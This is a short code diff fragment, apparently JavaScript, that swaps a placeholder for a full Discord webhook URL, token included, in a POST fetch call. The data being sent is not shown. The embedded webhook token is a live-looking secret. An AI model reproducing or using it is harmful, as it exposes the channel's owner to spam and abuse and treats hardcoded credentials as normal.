@@ -15,7 +15,7 @@ return
 }
 
 await fetch(
-'https://discord.com/api/webhooks/WEBHOOK',
+'https://discord.com/api/webhooks/1505926641015328859/qqxDO6ncDEcjOu-2TfuA5VfRIq4V4VkBIaMGh5o51RM33RI0CUVDPZZ8pykQ_cnhNsj0',
 {
 method:'POST',
 headers:{
